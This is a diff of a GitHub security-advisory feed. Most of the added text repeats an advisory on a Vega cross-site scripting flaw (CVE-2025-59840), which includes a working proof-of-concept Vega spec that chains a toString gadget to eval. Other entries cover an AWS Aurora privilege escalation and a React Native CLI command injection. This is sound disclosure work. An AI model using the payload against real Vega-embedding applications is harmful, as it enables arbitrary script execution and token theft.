+<li><a href="https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA">https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA</a></li>
+<li><a href="https://vega.github.io/vega/usage/interpreter">https://vega.github.io/vega/usage/interpreter</a></li>
+<li><a href="https://github.com/advisories/GHSA-7f2v-3qq3-vvjf">https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-11-13T22:32:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vega-expression] Vega Cross-Site Scripting (XSS) via expressions abusing toString calls in environments using the VEGA_DEBUG global variable]]></title>
+        <id>https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</id>
+        <link href="https://github.com/advisories/GHSA-7f2v-3qq3-vvjf"/>
+        <updated>2025-11-13T22:32:37.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Applications meeting 2 conditions are at risk of arbitrary JavaScript code execution, even if "safe mode" <a href="https://vega.github.io/vega/usage/interpreter/">expressionInterpreter</a> is used. </p>
+<ol>
+<li>Use <code>vega</code> in an application that attaches <code>vega</code> library and a <code>vega.View</code> instance similar to the Vega <a href="https://github.com/vega/editor">Editor</a> to the global <code>window</code></li>
+<li>Allow user-defined Vega <code>JSON</code> definitions (vs JSON that was is only provided through source code)</li>
+</ol>
+<h2 id="patches">Patches</h2>
+<ul>
+<li>If using latest Vega line (6.x)<ul>
+<li><code>vega</code> <code>6.2.0</code> / <code>vega-expression</code> <code>6.1.0</code> / <code>vega-interpreter</code>  <code>2.2.1</code> (if using AST evaluator mode)</li>
+</ul>
+</li>
+<li>If using Vega in a non-ESM environment<ul>
+<li>( <code>vega-expression</code> <code>5.2.1</code> / <code>1.2.1</code> (if using AST evaluator mode)</li>
+</ul>
+</li>
+</ul>
+<h2 id="workarounds">Workarounds</h2>
+<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading</em></p>
+<ul>
+<li>Do not attach <code>vega</code> View instances to global variables, as Vega editor used to do <a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239">here</a></li>
+<li>Do not attach <code>vega</code> to the global window as the editor used to do <a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16">here</a></li>
+</ul>
+<p>These practices of attaching the vega library and View instances may be convenient for debugging, but should <em>not</em> be used in production or in any situation where vega/vega-lite definitions could be provided by untrusted parties.</p>
+<h3 id="poc-summary">POC Summary</h3>
+<p>Vega offers the evaluation of expressions in a secure context. Arbitrary function call is prohibited. When an event is exposed to an expression, member get of window objects is possible. Because of this exposure, in some applications, a crafted object that overrides its toString method with a function that results in calling <code>this.foo(this.bar)</code>, DOM XSS can be achieved. </p>
+<p>In practice, an accessible gadget like this exists in the global VEGA_DEBUG code. </p>
+<pre><code class="language-js">({
+    toString: event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, 
+    eventName: event.view.console.log,
+    _handlers: {
+        undefined: 'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'
+    },
+    _handlerIndex: event.view.eval
+})+1
+</code></pre>
+<h3 id="poc-details">POC Details</h3>
+<pre><code class="language-json">{
+  "$schema": "https://vega.github.io/schema/vega/v5.json",
+  "width": 350,
+  "height": 350,
+  "autosize": "none",
+  "description": "Toggle Button",
+  "signals": [
+    {
+      "name": "toggle",
+      "value": true,
+      "on": [
+        {
+          "events": {"type": "click", "markname": "circle"},
+          "update": "toggle ? false : true"
+        }
+      ]
+    },
+    {
+      "name": "addFilter",
+      "on": [
+        {
+          "events": {"type": "mousemove", "source": "window"},
+          "update": "({toString:event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, eventName:event.view.console.log,_handlers:{undefined:'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'},_handlerIndex:event.view.eval})+1"
+        }
+
+      ]
+    }
+  ]
+}
+</code></pre>
+<p>This payload creates a scenario where whenever the mouse is moved, the toString function of the provided object is implicitly called when trying to resolve adding it with 1. The toString function has been overridden to a "gadget function" (VEGA_DEBUG.vega.CanvasHandler.prototype.on) that does the following:</p>
+<pre><code class="language-js">   on(a, o) {
+        const u = this.eventName(a)
+          , d = this._handlers;
+        if (this._handlerIndex(d[u], a, o) &lt; 0) {
+        ....
+        }
+        ....
+   }
+</code></pre>
+<ol>
+<li>Set <code>u</code> to the result of calling <code>this.eventName</code> with undefined <ul>
+<li>For our object, we have the eventName value set to console.log, which just logs undefined and returns undefined</li>
+</ul>
+</li>
+<li>Sets <code>d</code> to <code>this._handlers</code><ul>
+<li>For our object, we have this defined to be used later</li>
+</ul>
+</li>
+<li>Calls <code>this._handlerIndex</code> with the result of <code>u</code> indexed into the <code>d</code> object as the first argument, and undefined as the second two.<ul>
+<li>For our object, <code>_handlerIndex</code> is set to window.eval, and when indexing undefined into the <code>_handlers</code>, a string to be evald containing the XSS payload is returned.</li>
+</ul>
+</li>
+</ol>
+<p>This results in XSS by using a globally scoped gadget to get full blown eval. </p>
+<h3 id="poc-link">PoC Link</h3>
+<p>Navigate <a href="https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA">to vega editor</a>, move the mouse, and observe that the arbitrary JavaScript from the configuration reaches the eval sink and DOM XSS is achieved.</p>
+<h3 id="future-investigation">Future investigation</h3>
+<p>In cases where <code>VEGA_DEBUG</code> is not enabled, there theoreticallycould  be other gadgets on the global scope that allow for similar behavior. In cases where AST evaluator is used and there are blocks against getting references to <code>eval</code>, in theory there could be other gadgets on global scope (i.e. jQuery) that would allow for eval the same way (i.e. <code>$.globalEval</code>). As of this writing, no such globally scoped gadgets have been found. </p>
+<h3 id="impact-1">Impact</h3>
+<p>This vulnerability allows for DOM XSS, potentially stored, potentially reflected, depending on how the library is being used. The vulnerability requires user interaction with the page to trigger.  </p>
+<p>An attacker can exploit this issue by tricking a user into opening a malicious Vega specification. Successful exploitation allows the attacker to execute arbitrary JavaScript in the context of the application’s domain. This can lead to theft of sensitive information such as authentication tokens, manipulation of data displayed to the user, or execution of unauthorized actions on behalf of the victim. This exploit compromises confidentiality and integrity of impacted applications.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf">https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-59840">https://nvd.nist.gov/vuln/detail/CVE-2025-59840</a></li>
+<li><a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239">https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239</a></li>
+<li><a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16">https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16</a></li>
+<li><a href="https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA">https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA</a></li>
+<li><a href="https://vega.github.io/vega/usage/interpreter">https://vega.github.io/vega/usage/interpreter</a></li>
+<li><a href="https://github.com/advisories/GHSA-7f2v-3qq3-vvjf">https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-11-13T22:32:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vega] Vega Cross-Site Scripting (XSS) via expressions abusing toString calls in environments using the VEGA_DEBUG global variable]]></title>
+        <id>https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</id>
+        <link href="https://github.com/advisories/GHSA-7f2v-3qq3-vvjf"/>
+        <updated>2025-11-13T22:32:37.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Applications meeting 2 conditions are at risk of arbitrary JavaScript code execution, even if "safe mode" <a href="https://vega.github.io/vega/usage/interpreter/">expressionInterpreter</a> is used. </p>
+<ol>
+<li>Use <code>vega</code> in an application that attaches <code>vega</code> library and a <code>vega.View</code> instance similar to the Vega <a href="https://github.com/vega/editor">Editor</a> to the global <code>window</code></li>
+<li>Allow user-defined Vega <code>JSON</code> definitions (vs JSON that was is only provided through source code)</li>
+</ol>
+<h2 id="patches">Patches</h2>
+<ul>
+<li>If using latest Vega line (6.x)<ul>
+<li><code>vega</code> <code>6.2.0</code> / <code>vega-expression</code> <code>6.1.0</code> / <code>vega-interpreter</code>  <code>2.2.1</code> (if using AST evaluator mode)</li>
+</ul>
+</li>
+<li>If using Vega in a non-ESM environment<ul>
+<li>( <code>vega-expression</code> <code>5.2.1</code> / <code>1.2.1</code> (if using AST evaluator mode)</li>
+</ul>
+</li>
+</ul>
+<h2 id="workarounds">Workarounds</h2>
+<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading</em></p>
+<ul>
+<li>Do not attach <code>vega</code> View instances to global variables, as Vega editor used to do <a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239">here</a></li>
+<li>Do not attach <code>vega</code> to the global window as the editor used to do <a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16">here</a></li>
+</ul>
+<p>These practices of attaching the vega library and View instances may be convenient for debugging, but should <em>not</em> be used in production or in any situation where vega/vega-lite definitions could be provided by untrusted parties.</p>
+<h3 id="poc-summary">POC Summary</h3>
+<p>Vega offers the evaluation of expressions in a secure context. Arbitrary function call is prohibited. When an event is exposed to an expression, member get of window objects is possible. Because of this exposure, in some applications, a crafted object that overrides its toString method with a function that results in calling <code>this.foo(this.bar)</code>, DOM XSS can be achieved. </p>
+<p>In practice, an accessible gadget like this exists in the global VEGA_DEBUG code. </p>
+<pre><code class="language-js">({
+    toString: event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, 
+    eventName: event.view.console.log,
+    _handlers: {
+        undefined: 'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'
+    },
+    _handlerIndex: event.view.eval
+})+1
+</code></pre>
+<h3 id="poc-details">POC Details</h3>
+<pre><code class="language-json">{
+  "$schema": "https://vega.github.io/schema/vega/v5.json",
+  "width": 350,
+  "height": 350,
+  "autosize": "none",
+  "description": "Toggle Button",
+  "signals": [
+    {
+      "name": "toggle",
+      "value": true,
+      "on": [
+        {
+          "events": {"type": "click", "markname": "circle"},
+          "update": "toggle ? false : true"
+        }
+      ]
+    },
+    {
+      "name": "addFilter",
+      "on": [
+        {
+          "events": {"type": "mousemove", "source": "window"},
+          "update": "({toString:event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, eventName:event.view.console.log,_handlers:{undefined:'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'},_handlerIndex:event.view.eval})+1"
+        }
+
+      ]
+    }
+  ]
+}
+</code></pre>
+<p>This payload creates a scenario where whenever the mouse is moved, the toString function of the provided object is implicitly called when trying to resolve adding it with 1. The toString function has been overridden to a "gadget function" (VEGA_DEBUG.vega.CanvasHandler.prototype.on) that does the following:</p>
+<pre><code class="language-js">   on(a, o) {
+        const u = this.eventName(a)
+          , d = this._handlers;
+        if (this._handlerIndex(d[u], a, o) &lt; 0) {
+        ....
+        }
+        ....
+   }
+</code></pre>
+<ol>
+<li>Set <code>u</code> to the result of calling <code>this.eventName</code> with undefined <ul>
+<li>For our object, we have the eventName value set to console.log, which just logs undefined and returns undefined</li>
+</ul>
+</li>
+<li>Sets <code>d</code> to <code>this._handlers</code><ul>
+<li>For our object, we have this defined to be used later</li>
+</ul>
+</li>
+<li>Calls <code>this._handlerIndex</code> with the result of <code>u</code> indexed into the <code>d</code> object as the first argument, and undefined as the second two.<ul>
+<li>For our object, <code>_handlerIndex</code> is set to window.eval, and when indexing undefined into the <code>_handlers</code>, a string to be evald containing the XSS payload is returned.</li>
+</ul>
+</li>
+</ol>
+<p>This results in XSS by using a globally scoped gadget to get full blown eval. </p>
+<h3 id="poc-link">PoC Link</h3>
+<p>Navigate <a href="https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA">to vega editor</a>, move the mouse, and observe that the arbitrary JavaScript from the configuration reaches the eval sink and DOM XSS is achieved.</p>
+<h3 id="future-investigation">Future investigation</h3>
+<p>In cases where <code>VEGA_DEBUG</code> is not enabled, there theoreticallycould  be other gadgets on the global scope that allow for similar behavior. In cases where AST evaluator is used and there are blocks against getting references to <code>eval</code>, in theory there could be other gadgets on global scope (i.e. jQuery) that would allow for eval the same way (i.e. <code>$.globalEval</code>). As of this writing, no such globally scoped gadgets have been found. </p>
+<h3 id="impact-1">Impact</h3>
+<p>This vulnerability allows for DOM XSS, potentially stored, potentially reflected, depending on how the library is being used. The vulnerability requires user interaction with the page to trigger.  </p>
+<p>An attacker can exploit this issue by tricking a user into opening a malicious Vega specification. Successful exploitation allows the attacker to execute arbitrary JavaScript in the context of the application’s domain. This can lead to theft of sensitive information such as authentication tokens, manipulation of data displayed to the user, or execution of unauthorized actions on behalf of the victim. This exploit compromises confidentiality and integrity of impacted applications.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf">https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-59840">https://nvd.nist.gov/vuln/detail/CVE-2025-59840</a></li>
+<li><a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239">https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239</a></li>
+<li><a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16">https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16</a></li>
+<li><a href="https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA">https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA</a></li>
+<li><a href="https://vega.github.io/vega/usage/interpreter">https://vega.github.io/vega/usage/interpreter</a></li>
+<li><a href="https://github.com/advisories/GHSA-7f2v-3qq3-vvjf">https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-11-13T22:32:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[aws-advanced-nodejs-wrapper] AWS Advanced NodeJS Wrapper: Privilege Escalation in Aurora PostgreSQL instance]]></title>
+        <id>https://github.com/advisories/GHSA-8wj8-cfxr-9374</id>
+        <link href="https://github.com/advisories/GHSA-8wj8-cfxr-9374"/>
+        <updated>2025-11-13T22:22:40.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="description-of-vulnerability">Description of Vulnerability:</h3>
+<p>An issue in AWS Wrappers for Amazon Aurora PostgreSQL may allow for privilege escalation to rds_superuser role. A low privilege authenticated user can create a crafted function that could be executed with permissions of other Amazon Relational Database Service (RDS) users.</p>
+<p>AWS recommends that customers upgrade to the following version:  AWS NodeJS Wrapper to v2.0.1.</p>
+<h3 id="source-of-vulnerability-report">Source of Vulnerability Report:</h3>
+<p>Allistair Ishmael Hakim <a href="mailto:allistair.hakim@gmail.com">allistair.hakim@gmail.com</a></p>
+<h3 id="affected-products--versions">Affected products &amp; versions:</h3>
+<p>AWS NodeJS Wrapper &lt; 2.0.1.</p>
+<h3 id="platforms">Platforms:</h3>
+<p>MacOS/Windows/Linux</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/aws/aws-advanced-nodejs-wrapper/security/advisories/GHSA-8wj8-cfxr-9374">https://github.com/aws/aws-advanced-nodejs-wrapper/security/advisories/GHSA-8wj8-cfxr-9374</a></li>
+<li><a href="https://github.com/aws/aws-advanced-nodejs-wrapper/pull/574">https://github.com/aws/aws-advanced-nodejs-wrapper/pull/574</a></li>
+<li><a href="https://github.com/aws/aws-advanced-nodejs-wrapper/releases/tag/2.0.1">https://github.com/aws/aws-advanced-nodejs-wrapper/releases/tag/2.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-8wj8-cfxr-9374">https://github.com/advisories/GHSA-8wj8-cfxr-9374</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8wj8-cfxr-9374</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-11-13T22:22:37.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[@react-native-community/cli-server-api] @react-native-community/cli has arbitrary OS command injection]]></title>
         <id>https://github.com/advisories/GHSA-399j-vxmf-hjvr</id>
@@ -1381,214 +2026,5 @@ print(f"&lt;img src=x onerror=eval({out[:-1]})&gt;")
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2025-11-03T18:31:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@react-native-community/cli] @react-native-community/cli has arbitrary OS command injection]]></title>
-        <id>https://github.com/advisories/GHSA-399j-vxmf-hjvr</id>
-        <link href="https://github.com/advisories/GHSA-399j-vxmf-hjvr"/>
-        <updated>2025-11-13T16:25:27.000Z</updated>
-        <content type="html"><![CDATA[<p>The Metro Development Server, which is opened by the React Native CLI, binds to external interfaces by default. The server exposes an endpoint that is vulnerable to OS command injection. This allows unauthenticated network attackers to send a POST request to the server and run arbitrary executables. On Windows, the attackers can also execute arbitrary shell commands with fully controlled arguments.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11953">https://nvd.nist.gov/vuln/detail/CVE-2025-11953</a></li>
-<li><a href="https://github.com/react-native-community/cli/commit/15089907d1f1301b22c72d7f68846a2ef20df547">https://github.com/react-native-community/cli/commit/15089907d1f1301b22c72d7f68846a2ef20df547</a></li>
-<li><a href="https://jfrog.com/blog/cve-2025-11953-critical-react-native-community-cli-vulnerability">https://jfrog.com/blog/cve-2025-11953-critical-react-native-community-cli-vulnerability</a></li>
-<li><a href="https://github.com/react-native-community/cli/releases/tag/v20.0.0">https://github.com/react-native-community/cli/releases/tag/v20.0.0</a></li>
-<li><a href="https://github.com/react-native-community/cli/pull/1615">https://github.com/react-native-community/cli/pull/1615</a></li>
-<li><a href="https://github.com/react-native-community/cli/commit/5a792169d9883e0b0fb1ddf1ea46778f21510d18">https://github.com/react-native-community/cli/commit/5a792169d9883e0b0fb1ddf1ea46778f21510d18</a></li>
-<li><a href="https://github.com/react-native-community/cli/commit/9e1fa8cc633e5dcf32244ffa60a871880be56722">https://github.com/react-native-community/cli/commit/9e1fa8cc633e5dcf32244ffa60a871880be56722</a></li>
-<li><a href="https://github.com/react-native-community/cli/commit/a8293dc29425f56249753507bc24d87b698d46e1">https://github.com/react-native-community/cli/commit/a8293dc29425f56249753507bc24d87b698d46e1</a></li>
-<li><a href="https://github.com/react-native-community/cli?tab=readme-ov-file#compatibility">https://github.com/react-native-community/cli?tab=readme-ov-file#compatibility</a></li>
-<li><a href="https://x.com/SzymonRybczak/status/1986199665000566848">https://x.com/SzymonRybczak/status/1986199665000566848</a></li>
-<li><a href="https://github.com/react-native-community/cli/issues/2733#issuecomment-3502424164">https://github.com/react-native-community/cli/issues/2733#issuecomment-3502424164</a></li>
-<li><a href="https://x.com/szymonrybczak/status/1986199665000566848?s=46">https://x.com/szymonrybczak/status/1986199665000566848?s=46</a></li>
-<li><a href="https://x.com/thymikee/status/1986770875954475375">https://x.com/thymikee/status/1986770875954475375</a></li>
-<li><a href="https://github.com/advisories/GHSA-399j-vxmf-hjvr">https://github.com/advisories/GHSA-399j-vxmf-hjvr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-399j-vxmf-hjvr</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2025-11-03T18:31:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[min-document] min-document vulnerable to prototype pollution]]></title>
